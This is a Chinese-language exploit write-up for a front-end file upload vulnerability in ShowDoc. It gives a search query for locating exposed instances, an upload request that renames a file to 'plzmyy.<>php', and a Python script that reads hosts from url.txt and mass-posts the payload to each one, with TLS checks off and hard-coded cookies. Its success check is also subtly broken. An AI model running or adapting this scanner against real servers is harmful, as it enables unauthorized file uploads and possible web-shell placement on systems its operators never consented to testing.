# ShowDoc 前台文件上传漏洞

## 漏洞描述

参考链接：

- https://github.com/star7th/showdoc/pull/1059

## 网络测绘

```
app="ShowDoc"
```

## 漏洞复现

poc：

```
POST /server/index.php?s=/home/page/uploading HTTP/1.1
上传图片，并抓包，将文件名改为plzmyy.<>php
```

```python
import requests
requests.packages.urllib3.disable_warnings()

test = open('url.txt',"r")
for host in test.readlines():
    url = host+"/server/index.php?s=/home/page/uploading"
    payload = """------WebKitFormBoundary5j2IsrTFPjJCVtwU
    Content - Disposition: form - data;name = "editormd-image-file";filename = "plzmyy.<>php"
    Content - Type: text / plain

    123123test
    ------WebKitFormBoundary5j2IsrTFPjJCVtwU - -"""
    headers = {
        "Cookie": "PHPSESSID=shp3gipo9moaj58kp9n8sbi4f1; think_language=zh-CN; cookie_token=8ff04b9bba8b6abf30ab5e0be6cceea2192c9cf7a90d73b2d34d025d84feea2d",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Connection": "close",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Dest": "iframe",
        "Accept-Encoding": "gzip, deflate",
        "Sec-Fetch-Mode": "navigate",
        "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
        "sec-ch-ua-mobile": "?0",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Content-Length": "212",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary5j2IsrTFPjJCVtwU"
    }
    try:
        response = requests.request("POST", url, data=payload, headers=headers, verify=False, timeout=5)
    except:
        continue

    if response.text in 'success':
        print(response.text)
```

